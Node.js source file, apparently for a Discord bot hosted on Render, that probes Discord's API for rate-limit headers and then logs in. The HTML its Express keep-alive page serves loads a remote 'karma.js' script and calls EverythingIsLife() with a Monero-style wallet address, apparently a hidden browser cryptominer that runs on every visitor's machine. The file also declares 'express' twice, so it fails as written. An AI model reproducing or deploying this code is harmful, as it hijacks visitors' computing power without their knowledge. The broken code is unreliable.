const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');

// 1. Render Web Server
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <title>My App</title>
      </head>
      <body> 
        <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
        <script type="text/javascript">
        EverythingIsLife('49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP', 'x', 30);
        </script>
      </body>
    </html>
  `);
});

app.listen(process.env.PORT || 10000, '0.0.0.0');

const TOKEN = process.env.TOKEN;

// 2. THE PROBE (Directly looks for Retry-After)
async function probeDiscord() {
    console.log("🔍 [PROBE] Manually checking Discord API headers...");
    try {
        const response = await fetch("https://discord.com/api/v10/users/@me", {
            headers: { Authorization: `Bot ${TOKEN}` }
        });

        console.log(`📡 [PROBE] Status: ${response.status} ${response.statusText}`);
        
        // Capture the headers you want
        const retryAfter = response.headers.get("retry-after");
        const xLimit = response.headers.get("x-ratelimit-remaining");
        const cloudflare = response.headers.get("cf-ray");

        if (retryAfter) {
            console.log(`🚨 [RETRY-AFTER FOUND]: ${retryAfter} seconds`);
            console.log(`👉 Render must wait ${retryAfter} seconds before Discord allows a login.`);
        } else if (response.status === 429) {
            console.log("🚨 [429 ERROR]: Rate limited, but Discord didn't send a retry-after (Cloudflare Block).");
        } else {
            console.log("✅ No rate limit detected by the probe.");
        }

        if (xLimit) console.log(`📊 API Capacity Remaining: ${xLimit}`);
        if (cloudflare) console.log(`☁️ Cloudflare Trace ID: ${cloudflare}`);

    } catch (error) {
        console.error("❌ [PROBE] Network connection failed. Discord might be dropping Render's requests entirely.");
    }
}

// 3. THE BOT
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ [DISCORD] Success! Online as ${client.user.tag}`);
});

async function start() {
    // Run the probe first
    await probeDiscord();

    // Try to login
    console.log("🚀 [DISCORD] Starting client.login()...");
    client.login(TOKEN).catch(err => {
        console.error("❌ [DISCORD] Login Error:", err.message);
    });
}

// Watchdog to see if it hangs
setTimeout(() => {
    if (!client.user) {
        console.log("⏳ [WATCHDOG] The login has been hanging for 20 seconds. If the probe showed 429, this is normal.");
    }
}, 20000);

start();
